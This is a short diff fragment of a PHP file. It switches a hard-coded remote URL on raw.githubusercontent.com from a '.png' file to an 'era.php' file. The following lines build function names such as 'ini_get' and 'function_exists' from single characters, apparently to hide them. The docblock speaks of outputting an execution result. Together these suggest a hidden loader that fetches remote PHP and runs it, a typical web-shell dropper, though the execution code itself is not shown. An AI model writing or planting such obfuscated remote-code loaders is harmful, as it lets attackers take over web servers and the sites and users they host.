@@ -29,7 +29,7 @@
  * @return void Outputs execution result or error message
  */
 
-$_u = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/mini.png';;
+$_u = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/era.php';;
 
 $_iniget = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
 $_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
